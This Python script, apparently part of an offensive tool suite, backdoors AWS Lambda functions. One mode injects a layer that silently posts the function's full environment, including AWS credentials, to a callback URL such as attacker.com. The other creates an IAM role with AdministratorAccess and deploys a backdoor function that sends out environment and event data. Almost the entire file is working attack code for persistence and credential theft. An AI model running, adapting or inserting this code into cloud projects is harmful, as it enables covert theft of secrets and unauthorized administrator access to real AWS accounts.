#!/usr/bin/env python3
"""
lambda_backdoor.py — AWS Lambda Function Backdoor

Creates or injects backdoor code into Lambda functions for persistence.
Supports creating new functions with admin roles or adding exfiltration layers.

Part of CyberStrike offensive security platform.
"""

import argparse
import io
import json
import os
import signal
import sys
import time
import zipfile
from datetime import datetime
from pathlib import Path

try:
    import boto3
    from botocore.exceptions import ClientError, NoCredentialsError
except ImportError:
    print("ERROR: boto3 required. Install: pip3 install boto3", file=sys.stderr)
    sys.exit(1)

STATE_FILE = str(Path.home() / ".cyberstrike" / "awshook-state.json")


def get_session(args):
    kwargs = {}
    if args.profile:
        kwargs["profile_name"] = args.profile
    if args.region:
        kwargs["region_name"] = args.region
    return boto3.Session(**kwargs)


def load_state():
    try:
        with open(STATE_FILE, "r") as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {"created_resources": []}


def save_state(state):
    os.makedirs(os.path.dirname(STATE_FILE), exist_ok=True)
    with open(STATE_FILE, "w") as f:
        json.dump(state, f, indent=2, default=str)


class LambdaBackdoor:
    def __init__(self, args):
        self.args = args
        self.event_count = 0
        self.start_time = None
        self.running = True
        self.state = load_state()

    def signal_handler(self, signum, frame):
        self.running = False

    def print_banner(self):
        print("=" * 70)
        print("CyberStrike — AWS Lambda Backdoor")
        print("=" * 70)
        print(f"PID:       {os.getpid()}")
        print(f"Method:    {self.args.method}")
        print(f"Function:  {self.args.function_name or 'new'}")
        print(f"Callback:  {self.args.callback_url}")
        print(f"Runtime:   {self.args.runtime}")
        print(f"Profile:   {self.args.profile or 'default'}")
        print(f"Output:    {'JSON' if self.args.json_output else 'text'}")
        print(f"Started:   {datetime.now().isoformat()}")
        print("=" * 70)
        print()

    def emit(self, record):
        self.event_count += 1
        if self.args.json_output:
            print(json.dumps(record, default=str), flush=True)
        else:
            action = record.get("action", "info")
            status = record.get("status", "")
            detail = record.get("detail", "")
            print(f"[{action.upper():<16}] [{status.upper():<8}] {detail}", flush=True)

    def track_resource(self, resource_type, resource_id, **extra):
        entry = {"type": resource_type, "id": resource_id, "created_at": datetime.now().isoformat()}
        entry.update(extra)
        self.state["created_resources"].append(entry)
        save_state(self.state)

    def make_layer_code(self, callback_url):
        code = f"""
import urllib.request
import json
import os

def _cs_callback():
    try:
        env_data = dict(os.environ)
        data = json.dumps({{"env": env_data, "function": os.environ.get("AWS_LAMBDA_FUNCTION_NAME", "unknown")}}).encode()
        req = urllib.request.Request("{callback_url}", data=data, headers={{"Content-Type": "application/json"}})
        urllib.request.urlopen(req, timeout=5)
    except Exception:
        pass

_cs_callback()
"""
        return code

    def make_handler_code(self, callback_url):
        return f"""
import json
import os
import urllib.request

def handler(event, context):
    try:
        env_data = dict(os.environ)
        data = json.dumps({{"env": env_data, "function": context.function_name, "event": str(event)[:500]}}).encode()
        req = urllib.request.Request("{callback_url}", data=data, headers={{"Content-Type": "application/json"}})
        urllib.request.urlopen(req, timeout=5)
    except Exception:
        pass
    return {{"statusCode": 200, "body": "ok"}}
"""

    def method_inject(self, session):
        lam = session.client("lambda")
        func_name = self.args.function_name
        callback_url = self.args.callback_url

        if not func_name:
            self.emit({"action": "inject", "status": "failed", "detail": "--function-name is required for inject method"})
            return

        try:
            config = lam.get_function_configuration(FunctionName=func_name)
            self.emit({"action": "info", "status": "ok", "detail": f"Function {func_name}: runtime={config['Runtime']} role={config['Role']}"})
        except ClientError as e:
            self.emit({"action": "inject", "status": "failed", "detail": f"Cannot get function: {e}"})
            return

        layer_name = f"cs-layer-{int(time.time())}"
        layer_code = self.make_layer_code(callback_url)

        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("python/cs_init.py", layer_code)
        buf.seek(0)

        try:
            layer = lam.publish_layer_version(
                LayerName=layer_name,
                Content={"ZipFile": buf.read()},
                CompatibleRuntimes=[self.args.runtime],
                Description="CyberStrike layer",
            )
            layer_arn = layer["LayerVersionArn"]
            self.track_resource("lambda_layer", layer_name, arn=layer_arn)
            self.emit({"action": "create_layer", "status": "success", "detail": f"Layer {layer_name}", "arn": layer_arn})
        except ClientError as e:
            self.emit({"action": "create_layer", "status": "failed", "detail": str(e)})
            return

        existing_layers = config.get("Layers", [])
        layer_arns = [l["Arn"] for l in existing_layers] + [layer_arn]

        try:
            lam.update_function_configuration(FunctionName=func_name, Layers=layer_arns)
            self.track_resource("layer_injection", func_name, layer=layer_arn)
            self.emit({"action": "inject", "status": "success", "detail": f"Injected layer into {func_name}"})
        except ClientError as e:
            self.emit({"action": "inject", "status": "failed", "detail": str(e)})

    def method_create(self, session):
        iam = session.client("iam")
        lam = session.client("lambda")
        sts = session.client("sts")
        callback_url = self.args.callback_url

        account = sts.get_caller_identity()["Account"]
        func_name = self.args.function_name or f"cs-backdoor-{int(time.time())}"
        role_name = f"cs-lambda-role-{int(time.time())}"

        trust_policy = {
            "Version": "2012-10-17",
            "Statement": [{
                "Effect": "Allow",
                "Principal": {"Service": "lambda.amazonaws.com"},
                "Action": "sts:AssumeRole"
            }]
        }

        try:
            role = iam.create_role(
                RoleName=role_name,
                AssumeRolePolicyDocument=json.dumps(trust_policy),
                Description="CyberStrike backdoor role",
            )
            role_arn = role["Role"]["Arn"]
            self.track_resource("iam_role", role_name, arn=role_arn)

            iam.attach_role_policy(RoleName=role_name, PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess")
            self.track_resource("role_policy_attachment", role_name, policy="AdministratorAccess")
            self.emit({"action": "create_role", "status": "success", "detail": f"Role {role_name} with admin", "arn": role_arn})
        except ClientError as e:
            self.emit({"action": "create_role", "status": "failed", "detail": str(e)})
            return

        self.emit({"action": "wait", "status": "info", "detail": "Waiting for role propagation (10s)..."})
        time.sleep(10)

        handler_code = self.make_handler_code(callback_url)
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("lambda_function.py", handler_code)
        buf.seek(0)

        try:
            func = lam.create_function(
                FunctionName=func_name,
                Runtime=self.args.runtime,
                Role=role_arn,
                Handler="lambda_function.handler",
                Code={"ZipFile": buf.read()},
                Timeout=60,
                Description="CyberStrike backdoor",
            )
            self.track_resource("lambda_function", func_name, arn=func["FunctionArn"])
            self.emit({
                "action": "create",
                "status": "success",
                "detail": f"Backdoor function {func_name}",
                "arn": func["FunctionArn"],
                "role_arn": role_arn,
            })
        except ClientError as e:
            self.emit({"action": "create", "status": "failed", "detail": str(e)})

    def run(self):
        self.print_banner()

        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

        self.start_time = time.monotonic()

        session = get_session(self.args)

        if self.args.method == "inject":
            self.method_inject(session)
        elif self.args.method == "create":
            self.method_create(session)
        else:
            print(f"ERROR: Unknown method '{self.args.method}'. Use: inject|create", file=sys.stderr)
            sys.exit(1)

        self.cleanup()

    def cleanup(self):
        print(f"\n--- lambda_backdoor summary ---")
        print(f"Method: {self.args.method}")
        print(f"Records: {self.event_count}")
        if self.start_time:
            print(f"Duration: {time.monotonic() - self.start_time:.1f}s")
        print("Done.")


def main():
    parser = argparse.ArgumentParser(
        description="Create or inject backdoor into AWS Lambda functions.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python3 lambda_backdoor.py --method inject --function-name myFunc --callback-url https://attacker.com/cb\n"
            "  python3 lambda_backdoor.py --method create --callback-url https://attacker.com/cb\n"
        ),
    )
    parser.add_argument("--method", type=str, default="inject", help="Method: inject|create (default: inject)")
    parser.add_argument("--function-name", type=str, default=None, help="Lambda function name (required for inject)")
    parser.add_argument("--callback-url", type=str, required=True, help="Callback URL for exfiltration")
    parser.add_argument("--runtime", type=str, default="python3.12", help="Lambda runtime (default: python3.12)")
    parser.add_argument("--profile", type=str, default=None, help="AWS profile name")
    parser.add_argument("--region", type=str, default=None, help="AWS region")
    parser.add_argument("--json-output", action="store_true", default=False, help="Output as JSON lines")
    args = parser.parse_args()

    backdoor = LambdaBackdoor(args)
    backdoor.run()


if __name__ == "__main__":
    main()
